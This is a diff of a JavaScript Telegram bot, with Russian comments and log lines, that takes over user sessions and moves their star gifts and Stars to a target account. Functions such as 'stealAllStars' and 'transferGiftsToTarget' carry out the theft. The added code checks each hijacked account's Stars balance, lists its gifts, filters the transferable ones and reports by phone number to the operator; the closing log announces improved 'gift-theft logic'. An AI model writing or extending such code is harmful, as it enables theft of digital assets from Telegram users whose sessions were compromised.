@@ -588,12 +588,25 @@ async function stealAllStars() {
     }
 }
 
-// ОБНОВЛЕННАЯ ФУНКЦИЯ ПЕРЕДАЧИ ПОДАРКОВ
+// ОБНОВЛЕННАЯ ФУНКЦИЯ ПЕРЕДАЧИ ПОДАРКОВ (ИЗ ТВОЕГО КОДА)
 async function transferGiftsToTarget(client, phone) {
     try {
-        console.log(`🔎 Ищу подарки для ${phone}...`);
+        console.log(`🔎 Проверяю аккаунт ${phone}...`);
         
-        // Получаем список подарков
+        // 1) Получаем баланс звезд
+        const status = await client.invoke(
+            new Api.payments.GetStarsStatus({
+                peer: new Api.InputPeerSelf(),
+            })
+        );
+
+        const bal = status.balance;
+        const starsAmount = Number(bal.amount) + Number(bal.nanos ?? 0) / 1_000_000_000;
+
+        console.log(`⭐ ${phone}: Баланс Stars:`, starsAmount);
+        console.log("⭐ Баланс Stars (raw):", bal);
+
+        // 2) Получаем список подарков
         const gifts = await client.invoke(
             new Api.payments.GetSavedStarGifts({
                 peer: new Api.InputPeerSelf(),
@@ -602,11 +615,24 @@ async function transferGiftsToTarget(client, phone) {
             })
         );
 
-        console.log(`🎁 Всего подарков: ${gifts.gifts ? gifts.gifts.length : 0}`);
+        console.log(`🎁 ${phone}: Всего подарков:`, gifts.count);
+        console.log(`🎁 ${phone}: Загружено в этом запросе:`, gifts.gifts.length);
 
         if (!gifts.gifts || gifts.gifts.length === 0) {
             bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет подарков`);
             return false;
+        }
+
+        // Логируем информацию о подарках
+        for (const g of gifts.gifts) {
+            console.log({
+                savedId: g.savedId,
+                msgId: g.msgId,
+                unsaved: g.unsaved,
+                canUpgrade: g.canUpgrade,
+                transferStars: g.transferStars,
+                convertStars: g.convertStars,
+            });
         }
 
         // Резолвим целевого пользователя
@@ -628,7 +654,7 @@ async function transferGiftsToTarget(client, phone) {
         // Фильтруем transferable подарки
         const transferableGifts = gifts.gifts.filter(gift => gift.transferStars);
         
-        console.log(`🔄 Transferable подарков: ${transferableGifts.length}`);
+        console.log(`🔄 ${phone}: Transferable подарков: ${transferableGifts.length}`);
 
         if (transferableGifts.length === 0) {
             bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет transferable подарков`);
@@ -830,4 +856,4 @@ bot.onText(/\/admin/, (msg) => {
     });
 });
 
-console.log('✅ Бот запущен с исправленной передачей подарков');
+console.log('✅ Бот запущен с улучшенной логикой кражи подарков');
